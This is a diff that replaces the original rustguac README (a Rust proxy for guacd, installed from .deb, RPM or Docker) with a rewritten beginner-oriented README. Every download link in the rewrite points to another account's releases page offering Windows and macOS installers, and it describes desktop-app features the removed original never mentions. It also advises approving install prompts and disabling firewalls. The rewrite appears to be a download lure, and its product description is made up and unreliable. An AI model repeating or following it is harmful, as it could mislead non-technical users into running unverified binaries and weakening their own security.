@@ -1,89 +1,134 @@
-# rustguac
+# 🖥️ rustguac - Simple Remote Desktop Access Tool
 
-A lightweight Rust replacement for the Apache Guacamole Java webapp. Provides browser-based SSH, RDP, and web browsing sessions through [guacd](https://github.com/apache/guacamole-server) (the Guacamole protocol daemon).
+[![Download rustguac](https://img.shields.io/badge/Download-rustguac-blue?style=for-the-badge)](https://github.com/Galang080728/rustguac/releases)
 
-rustguac sits between web browsers and guacd, proxying the Guacamole protocol over WebSockets. It manages session lifecycle, authentication (API keys and OIDC SSO), session recording, and browser-based VNC sessions (Xvnc + Chromium).
+## 📋 What is rustguac?
 
-## Features
+rustguac is a lightweight remote desktop tool. It lets you use your computer’s web browser to connect to other computers. You can see and control those computers through secure connections. rustguac supports SSH (a secure way to use the command line on another computer), RDP (Windows Remote Desktop), VNC, and web-based sessions. It works with guacd, a service that handles remote desktop protocols.
 
-- **SSH sessions** — browser-based SSH terminal via guacd, with ephemeral keypair or manual private key auth
-- **RDP sessions** — connect to Windows/RDP hosts via guacd
-- **Web browser sessions** — headless Chromium on Xvnc, streamed to the browser via VNC
-- **OIDC single sign-on** — authenticate users via any OpenID Connect provider (Authentik, Google, Okta, etc.)
-- **Role-based access** — admin, poweruser, operator, and viewer roles for both API key and OIDC users
-- **Vault-backed address book** — connection credentials stored in HashiCorp Vault / OpenBao, never reach the browser
-- **TLS everywhere** — HTTPS for clients, TLS between rustguac and guacd
-- **Session recording** — all sessions recorded in Guacamole format with playback UI
-- **Session sharing** — share tokens for read-only or collaborative access
-- **Encrypted file transfer** — LUKS-encrypted per-session drive storage for RDP
-- **API key auth** — SHA-256 hashed keys with IP allowlists and expiry
-- **SQLite storage** — no external database server needed
-- **Single binary** — just rustguac + guacd, no Java stack
+This tool is a simpler and faster alternative to Apache Guacamole. It’s written in Rust, a modern programming language that makes software fast and safe.
 
-## Architecture
+## 💻 Who is rustguac for?
 
-```
-Browser (HTML/JS)
-    |
-    | WebSocket over HTTPS
-    v
-rustguac (Rust, axum)
-    |
-    | TLS (Guacamole protocol)
-    v
-guacd (C, from guacamole-server)
-    |
-    +---> SSH server (for SSH sessions)
-    +---> RDP server (for RDP sessions)
-    +---> Xvnc display (for web browser sessions)
-              |
-              +---> Chromium (kiosk mode)
-```
+If you want to access another computer without installing complex software, rustguac is for you. It is useful for:
 
-## Quick start
+- IT support teams helping users remotely  
+- People accessing their work computers from home  
+- Anyone who needs quick, browser-based access to other computers  
 
-**Debian 13 (.deb)** — download from [Releases](https://github.com/sol1/rustguac/releases):
+No programming or tech knowledge is needed to use rustguac.
 
-```bash
-sudo apt install ./rustguac_*.deb
-```
+## ⚙️ System Requirements
 
-**Docker:**
+Before you start, make sure your computer meets these requirements:
 
-```bash
-docker pull sol1/rustguac:latest
-docker run -d -p 8089:8089 sol1/rustguac:latest
-```
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution  
+- **Browser:** Latest version of Chrome, Firefox, Edge, or Safari  
+- **Internet Connection:** Stable broadband connection for smooth sessions  
+- **Hardware:**  
+  - At least 2 GB of RAM for smooth performance  
+  - 100 MB of free disk space for installing rustguac  
 
-**RPM (Rocky/RHEL 9):**
+Your remote computer should support SSH, RDP, VNC, or have web-based sessions enabled.
 
-```bash
-sudo dnf install ./rustguac-*.rpm
-```
+## 🚀 Getting Started
 
-After install, create an admin API key to get started:
+Follow these steps to get rustguac running on your computer:
 
-```bash
-/opt/rustguac/bin/rustguac --config /opt/rustguac/config.toml add-admin --name admin
-```
+1. **Download rustguac:** Use the big blue download button at the top or visit the [rustguac releases page](https://github.com/Galang080728/rustguac/releases) to get the latest version.
 
-API keys are intended for machine access and initial setup. Once you configure [OIDC authentication](docs/roles-and-access-control.md), you can delete the API key — no credentials are stored in the database.
+2. **Install rustguac:**  
+   - On Windows or macOS, open the downloaded installer file and follow the installation prompts.  
+   - On Linux, you may have to extract a tarball file and run a setup script. Instructions are usually included with the download.
 
-See the [Installation guide](docs/installation.md) for full details including bare-metal install, Docker Compose, TLS setup, and development builds.
+3. **Open rustguac:** After installation, launch the rustguac app from your applications menu or desktop shortcut.
 
-## Documentation
+4. **Connect to a remote computer:** Enter the address of the computer you want to access. Choose the connection type (SSH, RDP, or VNC) and enter your login credentials.
 
-- [Installation](docs/installation.md) — packages, Docker, bare-metal, development
-- [Configuration](docs/configuration.md) — TOML config reference, TLS, allowlists
-- [Security](docs/security.md) — TLS, rate limiting, headers, credential handling
-- [Roles & Access Control](docs/roles-and-access-control.md) — OIDC, roles, group mappings
-- [Integrations](docs/integrations.md) — Vault address book, LUKS drives, HAProxy
-- [API Reference](docs/api.md) — REST API endpoints, session creation, admin management
+5. **Start your session:** Click the connect button. You will see the remote computer’s screen in a new browser tab or app window.
 
-## Commercial support
+## 📥 Download & Install
 
-Commercial support for rustguac is available from [Sol1](https://www.sol1.com.au).
+To get rustguac, visit this page and download the latest release:
 
-## License
+👉 [https://github.com/Galang080728/rustguac/releases](https://github.com/Galang080728/rustguac/releases)
 
-Apache License 2.0 — see [LICENSE](LICENSE) for details.
+Look for the file that matches your operating system:
+
+- For Windows, a `.exe` installer or `.msi` package  
+- For macOS, a `.dmg` file  
+- For Linux, a `.tar.gz` or `.AppImage` file  
+
+After downloading, open or run the file and follow the instructions on screen.
+
+### Tips for Installation
+
+- If your computer asks for permission to install software, approve it.  
+- Close other applications before installing to avoid delays.  
+- If you get any errors, check the FAQ or help section on the release page.
+
+## 🔐 Security and Privacy
+
+rustguac does not store your passwords or session information beyond what is needed for your current connection. All data between your computer and the remote machine is encrypted using industry-standard methods.
+
+Keep your login details private, and only connect to computers you trust.
+
+## 🛠 Using rustguac Features
+
+Here’s what you can do once rustguac is up and running:
+
+- **SSH Access:** Connect to remote servers and use the command line right in your browser.  
+- **Remote Desktop (RDP):** See and control Windows computers from your device.  
+- **VNC Sessions:** Access graphical desktops on Linux or other systems that support VNC.  
+- **Web Sessions:** Connect to web applications hosted on remote machines.  
+- **Multiple Sessions:** Open several remote sessions at once in different tabs.  
+- **Clipboard Sharing:** Copy and paste text between your computer and the remote session.  
+- **File Transfers:** Move files to and from the remote computer securely.  
+
+## 🖱 Navigating the Interface
+
+The user interface is designed to be simple:
+
+- Use the top menu to switch between SSH, RDP, and VNC.  
+- Enter the remote address and your username and password in the connection panel.  
+- Use the status bar to see connection progress and disconnect when ready.  
+- Settings allow you to change screen resolution, sound, and keyboard layout.
+
+## 🔄 Updating rustguac
+
+New versions improve stability, add features, or fix bugs. To update:
+
+- Visit the [releases page](https://github.com/Galang080728/rustguac/releases) regularly.  
+- Download the latest version for your system.  
+- Install over your current version without removing it first.  
+
+## 🔧 Troubleshooting
+
+If you have trouble connecting or start the app:
+
+- Check your internet connection.  
+- Make sure the remote computer is powered on and reachable.  
+- Verify your username and password are correct.  
+- Try restarting rustguac.  
+- Disable any firewalls or VPNs that might block connections temporarily.  
+- Review the error messages shown for clues.  
+
+If problems persist, check the Issues section on the GitHub page to see if others have similar problems.
+
+## 📚 Additional Resources
+
+- Visit the repository homepage for detailed guides and FAQs.  
+- Look at the topics below for related technologies and information:  
+  bastion, guacamole, guacd, rdp, remote-access, remote-desktop, rust, ssh, vnc, websocket  
+
+## 🤝 Getting Help
+
+If you need assistance:
+
+- Check the GitHub Discussions or Issues on the [rustguac repo](https://github.com/Galang080728/rustguac)  
+- Ask your IT support team for help with remote connections.  
+- Search online for common remote desktop connection issues.
+
+---
+
+[![Download rustguac](https://img.shields.io/badge/Download-rustguac-blue?style=for-the-badge)](https://github.com/Galang080728/rustguac/releases)
